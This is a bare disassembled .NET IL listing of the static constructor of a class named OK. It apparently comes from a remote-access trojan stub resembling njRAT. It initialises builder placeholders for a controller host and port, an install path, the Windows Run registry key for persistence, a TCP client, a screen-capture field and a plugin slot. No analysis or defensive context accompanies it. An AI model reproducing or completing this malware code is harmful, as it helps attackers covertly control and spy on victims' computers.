  .method private specialname rtspecialname static 
          void  .cctor() cil managed
  {
    // Code size       246 (0xf6)
    .maxstack  1
    IL_0000:  ldstr      "[VN]"
    IL_0005:  stsfld     string j.OK::VN
    IL_000a:  ldstr      "0.7d"
    IL_000f:  stsfld     string j.OK::VR
    IL_0014:  ldnull
    IL_0015:  stsfld     object j.OK::MT
    IL_001a:  ldstr      "[EXE]"
    IL_001f:  stsfld     string j.OK::EXE
    IL_0024:  ldstr      "[DR]"
    IL_0029:  stsfld     string j.OK::DR
    IL_002e:  ldstr      "[RG]"
    IL_0033:  stsfld     string j.OK::RG
    IL_0038:  ldstr      "[H]"
    IL_003d:  stsfld     string j.OK::H
    IL_0042:  ldstr      "[P]"
    IL_0047:  stsfld     string j.OK::P
    IL_004c:  ldstr      "|'|'|"
    IL_0051:  stsfld     string j.OK::Y
    IL_0056:  ldstr      "[BD]"
    IL_005b:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_0060:  stsfld     bool j.OK::BD
    IL_0065:  ldstr      "[Idr]"
    IL_006a:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_006f:  stsfld     bool j.OK::Idr
    IL_0074:  ldstr      "[Isf]"
    IL_0079:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_007e:  stsfld     bool j.OK::IsF
    IL_0083:  ldstr      "[Isu]"
    IL_0088:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_008d:  stsfld     bool j.OK::Isu
    IL_0092:  call       class [mscorlib]System.Reflection.Assembly [mscorlib]System.Reflection.Assembly::GetEntryAssembly()
    IL_0097:  callvirt   instance string [mscorlib]System.Reflection.Assembly::get_Location()
    IL_009c:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
    IL_00a1:  stsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
    IL_00a6:  newobj     instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::.ctor()
    IL_00ab:  stsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
    IL_00b0:  ldnull
    IL_00b1:  stsfld     class j.kl j.OK::kq
    IL_00b6:  ldc.i4.0
    IL_00b7:  stsfld     bool j.OK::Cn
    IL_00bc:  ldstr      "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    IL_00c1:  stsfld     string j.OK::sf
    IL_00c6:  ldnull
    IL_00c7:  stsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
    IL_00cc:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
    IL_00d1:  stsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
    IL_00d6:  ldc.i4     0x1401
    IL_00db:  newarr     [mscorlib]System.Byte
    IL_00e0:  stsfld     uint8[] j.OK::b
    IL_00e5:  ldstr      ""
    IL_00ea:  stsfld     string j.OK::lastcap
    IL_00ef:  ldnull
    IL_00f0:  stsfld     object j.OK::PLG
    IL_00f5:  ret
  } // end of method OK::.cctor
